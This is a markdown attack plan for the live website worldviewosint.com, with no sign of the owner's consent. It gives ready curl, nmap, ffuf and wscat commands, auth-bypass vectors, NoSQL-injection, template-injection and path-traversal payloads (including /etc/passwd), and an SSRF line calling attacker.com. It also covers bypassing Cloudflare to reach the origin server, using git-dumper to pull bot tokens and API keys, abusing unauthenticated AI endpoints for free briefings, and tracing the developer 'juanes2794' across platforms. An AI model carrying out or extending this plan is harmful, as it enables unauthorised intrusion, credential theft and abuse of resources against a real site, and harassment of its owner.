# Next Steps — Deep Penetration & Intelligence Gathering

**Last updated:** 2026-05-21
**Status:** Planning — awaiting execution

---

## What We've Already Exhausted

- Passive DNS / WHOIS / TLS recon
- HTTP header analysis (full response headers captured)
- Endpoint discovery (49 paths probed — all SPA catch-all except 16 real API routes)
- Full JavaScript source code analysis (app.js — 12KB, unobfuscated)
- All 16 API endpoint responses captured and analyzed
- Mapbox token decode (account: juanes2794)
- Data authenticity cross-referencing against USGS, ADS-B, AIS databases
- 7 structured reports generated

---

## TIER 1 — High-Value, Immediate

### 1. Live Browser Session via Playwright

We skipped this because Node.js wasn't installed. This is the **single biggest gap** — a live headless browser captures things static curl requests miss:

- **WebSocket frames** — the backend may have a socket.io or raw WS connection we never see with HTTP-only probing
- **Dynamic XHR sequencing** — what fires after the initial 3-second delay, what fires at 30s/45s intervals
- **Mapbox tile requests** — every map pan/zoom generates tile fetches; those URLs reveal what style layers and data sources are configured server-side
- **Cookie / localStorage state** — what gets written during a real session
- **Console output** — the app has a console logging system (`consoleLogs`); a live session captures all those messages
- **Screenshots** — visual documentation of the UI in each state

**Tools:** `npm install playwright` + the `scripts/capture.js` we already wrote

**Effort:** 15 min | **Expected Yield:** HIGH — WebSocket discovery, full traffic waterfall, screenshots

---

### 2. Full HTTP Method Fuzzing on Real Endpoints

We only sent GET requests. Every real endpoint should be tested with:

```
OPTIONS, HEAD, POST, PUT, PATCH, DELETE
```

Especially interesting targets:

| Endpoint | Test | Why |
|----------|------|-----|
| `OPTIONS /api/osint/*` | CORS preflight | Reveals allowed methods |
| `POST /api/osint/conflicts` | Write access | Can you inject conflict data? |
| `DELETE /api/osint/oryx` | Deletion | Can you wipe entries? |
| `PUT /api/ai/toggle` | Alt method | Does it accept methods beyond POST? |
| `PATCH /api/telegram/report` | Method switch | Different behavior than GET? |
| `POST /api/health` | Write to health | Can you modify status? |

**Tools:** Python script or `curl -X METHOD`

**Effort:** 10 min | **Expected Yield:** HIGH — write access to data, hidden methods

---

### 3. Authentication Bypass on `/api/telegram/report`

This is the only auth-protected endpoint. Test vectors:

| Vector | Method |
|--------|--------|
| **Cookie replay** | If the site sets any cookie during a session, replay it against the endpoint |
| **Referer header** | Add `Referer: https://worldviewosint.com/` |
| **X-Forwarded-For** | `127.0.0.1`, `localhost`, `10.0.0.1` |
| **Method switching** | POST, PUT, PATCH instead of GET |
| **Parameter injection** | `?auth=true`, `?admin=1`, `?key=test`, `?token=test` |
| **JWT/Bearer** | `Authorization: Bearer test`, `Authorization: Bearer null` |
| **Session fixation** | Send arbitrary session cookie values |
| **Content-Type trick** | `Content-Type: application/json` with `{"authenticated": true}` |
| **Path traversal** | `/api/telegram/../telegram/report`, `/api/./telegram/report` |
| **Case variation** | `/api/Telegram/Report`, `/API/telegram/report` |

**Tools:** curl with custom headers, Burp Suite

**Effort:** 15 min | **Expected Yield:** MEDIUM-HIGH — Telegram bot access if bypass works

---

### 4. Activate AI Endpoints (FREE Intelligence)

The AI endpoints are **completely unauthenticated**. Execute in order:

```bash
# Step 1: Turn on AI
curl -X POST https://worldviewosint.com/api/ai/toggle \
  -H "Content-Type: application/json" \
  -d '{"enabled": true}'

# Step 2: Trigger DeepSeek analysis
curl https://worldviewosint.com/api/ai/force

# Step 3: Read the intelligence briefing
curl https://worldviewosint.com/api/ai/status
# The lastAnalysis field contains the full AI briefing text
```

Do this up to 6 times (max/day) to get free AI-generated intelligence briefings. This reveals:
- What data the server feeds to DeepSeek
- How the AI prompt is structured
- The full server-side data model (AI sees more than the client)
- Token usage and cost per analysis

**Tools:** curl, Python script

**Effort:** 5 min | **Expected Yield:** HIGH — free intel briefings, server-side data model exposure

---

### 5. Port Scanning

We only tested port 443. The origin server might expose other services.

Since it's behind Cloudflare, direct scanning hits Cloudflare's IPs. But we can still:
- Test common alt ports through Cloudflare: 2053, 2083, 2087, 2096, 8443 (Cloudflare-proxied HTTPS ports)
- Test Cloudflare-proxied HTTP ports: 80, 8080, 8880, 2052, 2082, 2086, 2095
- Check if any port responds differently

```bash
nmap -sV -sC -p 80,443,2052,2053,2082,2083,2086,2087,2095,2096,8080,8443,8880 worldviewosint.com
```

**After** finding the origin IP (Tier 2), do a full port scan:
```bash
nmap -sV -sC -p- <ORIGIN_IP>
```

**Tools:** nmap, masscan, rustscan

**Effort:** 10-30 min | **Expected Yield:** MEDIUM — alternate services, origin IP services

---

### 6. Directory / Path Brute-Force with Targeted Wordlist

Our 49-path probe was based on common paths. Use a real wordlist targeted to the tech stack.

#### Node.js Specific
```
/node_modules/
/package.json
/package-lock.json
/.npmrc
/server.js
/index.js
/.node-version
/yarn.lock
/pnpm-lock.yaml
```

#### Config / DevOps
```
/.gitignore
/.git/HEAD
/.git/config
/docker-compose.yml
/Dockerfile
/.dockerignore
/ecosystem.config.js    (PM2)
/Procfile               (Heroku)
/.env.local
/.env.production
/.env.development
/config/
/settings.json
```

#### Hidden API Routes
```
/api/v3/
/api/internal/
/api/admin/
/api/debug/
/api/test/
/api/osint/all
/api/export
/api/dump
/api/backup
/api/users
/api/auth
/api/login
/api/register
/api/sessions
/api/logs
/api/webhook
/api/cron
/api/config
/api/env
/api/metrics
/api/prometheus
/api/grafana
```

**Tools:** ffuf, gobuster, dirsearch, feroxbuster

```bash
ffuf -u https://worldviewosint.com/FUZZ -w wordlist.txt -mc 200,301,302,401,403 -fs <SPA_SIZE>
```

The `-fs` flag filters out responses matching the SPA catch-all size (20,848 bytes), showing only real distinct responses.

**Effort:** 20 min | **Expected Yield:** HIGH — .git exposure, config files, hidden endpoints

---

### 7. Parameter Fuzzing on Known API Endpoints

Every endpoint should be tested with query parameters to discover hidden functionality:

```
/api/osint/conflicts?limit=1
/api/osint/conflicts?limit=1000
/api/osint/conflicts?page=2
/api/osint/conflicts?offset=10
/api/osint/conflicts?region=Ukraine
/api/osint/conflicts?intensity=CRITICAL
/api/osint/conflicts?format=csv
/api/osint/conflicts?format=xml
/api/osint/conflicts?fields=name,lat,lon
/api/osint/conflicts?sort=intensity
/api/osint/conflicts?verbose=true
/api/osint/conflicts?debug=true

/api/osint/aviation?military=false
/api/osint/aviation?military=true
/api/osint/aviation?source=opensky
/api/osint/aviation?limit=500

/api/osint/maritime?mmsi=477995030
/api/osint/maritime?limit=300          # Server has 269 vessels, client gets 50
/api/osint/maritime?all=true
/api/osint/maritime?history=true

/api/osint/disasters?type=EARTHQUAKE
/api/osint/disasters?magnitude_min=5

/api/health?verbose=true
/api/health?debug=true
/api/health?format=detailed
```

**Tools:** Arjun (automatic parameter discovery), wfuzz, Burp Intruder

**Effort:** 30 min | **Expected Yield:** HIGH — hidden data, full vessel list, debug info

---

## TIER 2 — Origin IP Discovery (Bypasses Cloudflare)

Finding the real server IP unlocks direct access, bypassing all CDN protections.

### 8. Certificate Transparency Logs

Search CT logs for all certificates ever issued for `worldviewosint.com`:

```
https://crt.sh/?q=worldviewosint.com
https://crt.sh/?q=%.worldviewosint.com
```

Historical certs may have been issued before Cloudflare proxying began, revealing the origin IP in certificate metadata.

**Tools:** crt.sh, certspotter, Censys Search

**Effort:** 10 min | **Expected Yield:** MEDIUM — origin IP from pre-Cloudflare certs

---

### 9. Historical DNS Records

The domain was registered March 28, 2026. Check if DNS briefly pointed to the origin IP before Cloudflare was configured:

| Service | URL |
|---------|-----|
| SecurityTrails | https://securitytrails.com/domain/worldviewosint.com/dns |
| ViewDNS.info | https://viewdns.info/iphistory/?domain=worldviewosint.com |
| DNSdumpster | https://dnsdumpster.com/ |
| DNSHistory | https://dnshistory.org/ |
| Wayback Machine | Check if archive.org captured the site before Cloudflare |

**Tools:** SecurityTrails API, ViewDNS.info, DNSdumpster

**Effort:** 10 min | **Expected Yield:** MEDIUM-HIGH — origin IP if DNS was ever exposed

---

### 10. Shodan / Censys / ZoomEye Fingerprint Search

Search for the application's unique fingerprint across the entire internet:

```
# Shodan queries
http.html:"WORLDVIEW OSINT"
http.html:"C4ISR v3.2"
http.title:"WORLDVIEW OSINT"
http.html:"juanes2794"

# Censys queries
services.http.response.body:"WORLDVIEW OSINT"
services.http.response.body:"C4ISR v3.2"

# FOFA queries
body="WORLDVIEW OSINT"
body="C4ISR v3.2"
```

If the origin server responds on its real IP without Cloudflare, these searches will find it directly.

Also search for the AIS service:
```
Shodan: http.html:"aisConnected" port:3000,4000,8080,8443
```

**Tools:** Shodan, Censys, ZoomEye, FOFA

**Effort:** 10 min | **Expected Yield:** HIGH — origin IP, other exposed services

---

### 11. Cloudflare Bypass Techniques

| Technique | Method |
|-----------|--------|
| **Unproxied subdomains** | Check `direct.`, `origin.`, `mail.`, `cpanel.`, `ftp.` subdomains |
| **IPv6 direct** | Sometimes IPv6 isn't proxied — try direct AAAA record connection |
| **DNS rebinding** | If the server validates hostname, different behavior on raw IP |
| **Cloudflare partner API** | Some API endpoints bypass the CDN |
| **MX records** | If email is hosted on the same server, MX records expose the IP |
| **SPF/DKIM records** | TXT records may contain the origin IP |
| **Web archive** | Wayback Machine may have cached the site before Cloudflare |

**Tools:** CloudFlair, CloakQuest3r, Bypass-firewalls-by-DNS-history

**Effort:** 15 min | **Expected Yield:** MEDIUM — depends on configuration

---

## TIER 3 — Active API Exploitation

### 12. AIS Data Deep-Dive

The system tracks 269 vessels but only serves 50 to the client. The server has more data.

| Test | Expected Result |
|------|-----------------|
| `/api/osint/maritime?limit=300` | Full vessel list (269) |
| `/api/osint/maritime?all=true` | All data including historical |
| `/api/osint/maritime?mmsi=477995030` | Single vessel details |
| `/api/osint/maritime?history=true` | Position history per vessel |
| `/api/osint/maritime?raw=true` | Raw AIS NMEA sentences |
| `/api/osint/maritime?format=geojson` | GeoJSON export |
| `/api/osint/maritime?bbox=20,30,50,60` | Bounding box filter |

Finding the full vessel list and historical positions would be the most valuable AIS intelligence.

---

### 13. WebSocket Enumeration

The SPA probing showed `/socket.io/` and `/ws` returned the catch-all HTML, but WebSocket connections require proper upgrade handshakes:

```bash
# Test socket.io
wscat -c "wss://worldviewosint.com/socket.io/?EIO=4&transport=websocket"

# Test raw WebSocket
wscat -c "wss://worldviewosint.com/ws"
wscat -c "wss://worldviewosint.com/websocket"
wscat -c "wss://worldviewosint.com/live"
wscat -c "wss://worldviewosint.com/stream"
wscat -c "wss://worldviewosint.com/api/stream"
wscat -c "wss://worldviewosint.com/api/ws"
```

If a WebSocket server exists, it may push real-time data without polling — a direct feed of all updates.

**Tools:** wscat, websocat, Burp Suite WebSocket interceptor

---

### 14. Injection Testing

Since APIs accept requests without auth, test for server-side vulnerabilities:

#### NoSQL Injection (Node.js + MongoDB is common)
```
/api/osint/conflicts?intensity[$ne]=null
/api/osint/conflicts?intensity[$gt]=
/api/osint/maritime?mmsi[$gt]=0
/api/osint/maritime?mmsi[$regex]=.*
/api/osint/conflicts?$where=1
```

#### Server-Side Template Injection
```
/api/osint/conflicts?name={{7*7}}
/api/osint/conflicts?name=${7*7}
```

#### SSRF via AI
If the DeepSeek integration sends user-controlled data to an external API, we might inject URLs:
```
POST /api/ai/toggle {"enabled": true, "webhook": "http://attacker.com/callback"}
```

#### Path Traversal
```
/api/osint/../../../etc/passwd
/api/osint/conflicts/../../server.js
```

**Tools:** NoSQLMap, tplmap, Burp Suite, manual testing

---

## TIER 4 — OSINT on the Developer

### 15. juanes2794 Digital Footprint

The Mapbox username is our anchor. Search across platforms:

| Platform | Search |
|----------|--------|
| **GitHub** | `juanes2794` — may have other repos, possibly the server-side code |
| **npm** | Check if they've published packages |
| **PyPI** | Published Python packages |
| **Docker Hub** | Published container images |
| **Stack Overflow** | Username search |
| **Reddit** | Username search |
| **Twitter/X** | `juanes2794` or variations |
| **Instagram** | `juanes2794` |
| **LinkedIn** | "Juanes" in Valle del Cauca, Colombia |
| **Telegram** | Search for the bot username (if we discover it) |
| **Medium / Dev.to** | Blog posts about OSINT dashboards |
| **Discord** | OSINT community servers |

**Effort:** 30 min | **Expected Yield:** HIGH — may find server-side source code on GitHub

---

### 16. Mapbox Account Investigation

- Check if Mapbox has a public profile: `https://api.mapbox.com/styles/v1/juanes2794?access_token=...`
- List all public styles created by the account
- Check for custom tilesets that might contain private data layers

---

### 17. Domain Registration History

- Reverse WHOIS on "Valle del Cauca" registrant location — what other domains are registered from there?
- Check if juanes2794 has registered other domains
- Search domain parking / expired domain databases for related domains

---

### 18. Git Repository Exposure Check

If `.git` is exposed on the server, we can reconstruct the **entire server-side codebase**:

```bash
curl -s https://worldviewosint.com/.git/HEAD
curl -s https://worldviewosint.com/.git/config
curl -s https://worldviewosint.com/.git/refs/heads/main
```

If any of these return valid git data (not the SPA HTML), use git-dumper to extract everything:

```bash
git-dumper https://worldviewosint.com/.git/ ./server-source
```

This would reveal:
- Server-side code (Node.js)
- Database configuration
- Telegram bot token
- DeepSeek API key
- AIS feed credentials
- All environment variables
- Full commit history

**Tools:** git-dumper, GitTools, gitjacker

**Effort:** 5 min to check, 10 min to dump | **Expected Yield:** CRITICAL if exposed

---

## TIER 5 — Temporal & Behavioral Analysis

### 19. Multi-Point Data Capture

Run the full capture script at 4 different times (6-hour intervals) and diff the results:

| Data Stream | What Changing Proves | What Static Proves |
|-------------|---------------------|--------------------|
| Conflicts | Live OSINT feed | Manually curated (as suspected) |
| Aviation callsigns | Real ADS-B rotation | Cached/replayed data |
| AIS vessels | Live maritime tracking | Cached snapshot |
| Earthquakes | Real-time USGS | Stale cache |
| BTC price | Live Binance | Cached price |
| Economic headlines | Dynamic news feed | Static content |
| Risk score | Recalculated | Hardcoded |

**Tools:** cron job + existing Python scripts + `diff`

**Effort:** 24 hours (automated) | **Expected Yield:** HIGH — definitive data authenticity confirmation

---

### 20. Response Timing Analysis

Measure response times for each endpoint to determine what's cached vs. live:

```bash
for endpoint in /api/health /api/risk-summary /api/osint/conflicts /api/osint/aviation /api/osint/maritime /api/osint/disasters; do
  time=$(curl -s -o /dev/null -w "%{time_total}" "https://worldviewosint.com$endpoint")
  echo "$endpoint: ${time}s"
done
```

| Response Time | Likely Means |
|:-------------:|--------------|
| < 10ms | Cached / in-memory data |
| 50-200ms | Server-side computation |
| > 500ms | External API call on each request |

**Effort:** 5 min | **Expected Yield:** MEDIUM — reveals caching architecture

---

### 21. Polling Race Condition

The client polls every 45s. If we poll faster (every 1s for 5 minutes), we can:

- Detect exactly when data updates (server-side refresh cycle)
- Find the actual refresh interval for each data source
- Detect if updates happen in batches or individually
- Identify if there's a cache TTL

```python
import time, requests
for i in range(300):  # 5 minutes at 1/sec
    r = requests.get("https://worldviewosint.com/api/osint/aviation")
    data = r.json()
    print(f"[{i}s] mil={data['milCount']} civ={data['civCount']}")
    time.sleep(1)
```

**Effort:** 10 min | **Expected Yield:** MEDIUM — server-side polling cadence

---

## TIER 6 — Vulnerability Scanning

### 22. Nuclei Scan

Automated vulnerability scanning with community templates:

```bash
nuclei -u https://worldviewosint.com -t cves/ -t exposures/ -t misconfiguration/ -t technologies/ -t default-logins/
```

Checks for:
- Known CVEs in detected stack (Node.js, Mapbox, Vue)
- Exposed admin panels, debug endpoints
- Misconfigurations specific to the tech stack
- Default credentials

**Tools:** Nuclei (ProjectDiscovery)

**Effort:** 15 min | **Expected Yield:** MEDIUM — known CVEs, misconfigs

---

### 23. Burp Suite Active Scan

Full active scan targeting:
- Spider/crawler for complete site map
- Active scanner (XSS, SQLi, SSRF, SSTI, etc.)
- WebSocket frame analysis
- Session token entropy analysis
- Content discovery

**Tools:** Burp Suite Professional

---

### 24. OWASP ZAP (Open-Source Alternative)

```bash
zap-cli quick-scan https://worldviewosint.com
zap-cli active-scan https://worldviewosint.com
zap-cli report -o zap-report.html -f html
```

**Tools:** OWASP ZAP

---

### 25. SSL/TLS Deep Audit

```bash
testssl.sh https://worldviewosint.com
# or
sslyze worldviewosint.com
```

Checks for:
- Weak cipher suites
- Protocol downgrade attacks
- BEAST / POODLE / DROWN
- Certificate chain issues
- HSTS preload status
- OCSP stapling
- Key exchange strength

**Tools:** testssl.sh, sslyze, SSL Labs online

---

## Recommended Execution Order

| Priority | Phase | Effort | Expected Yield | Status |
|:--------:|-------|:------:|:--------------:|:------:|
| 1 | Install Node.js + run Playwright capture | 15 min | HIGH | Pending |
| 2 | HTTP method fuzzing on all 16 endpoints | 10 min | HIGH | Pending |
| 3 | Activate AI endpoints (toggle + force) | 5 min | HIGH | Pending |
| 4 | Git repo exposure check (`.git/HEAD`) | 2 min | CRITICAL if exposed | Pending |
| 5 | Path brute-force with Node.js wordlist | 20 min | HIGH | Pending |
| 6 | Auth bypass on `/api/telegram/report` | 15 min | MEDIUM-HIGH | Pending |
| 7 | CT logs + historical DNS | 10 min | MEDIUM-HIGH | Pending |
| 8 | Shodan/Censys fingerprint search | 10 min | HIGH | Pending |
| 9 | GitHub search for juanes2794 | 5 min | HIGH | Pending |
| 10 | WebSocket handshake testing | 10 min | MEDIUM | Pending |
| 11 | Parameter fuzzing on API endpoints | 30 min | HIGH | Pending |
| 12 | Response timing analysis | 5 min | MEDIUM | Pending |
| 13 | Multi-point temporal capture | 24 hrs | HIGH | Pending |
| 14 | Nuclei vulnerability scan | 15 min | MEDIUM | Pending |
| 15 | SSL/TLS deep audit | 10 min | LOW-MEDIUM | Pending |

---

## Tools to Install

```bash
# Node.js (for Playwright)
winget install OpenJS.NodeJS.LTS

# Playwright
npm install -g playwright
npx playwright install chromium

# Security tools (Python)
pip install arjun sqlmap

# Go tools
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install github.com/ffuf/ffuf/v2@latest
go install github.com/tomnomnom/httprobe@latest

# Node tools
npm install -g wscat

# Git dumper
pip install git-dumper

# Other
# nmap — https://nmap.org/download
# Burp Suite — https://portswigger.net/burp
# testssl.sh — https://github.com/drwetter/testssl.sh
```
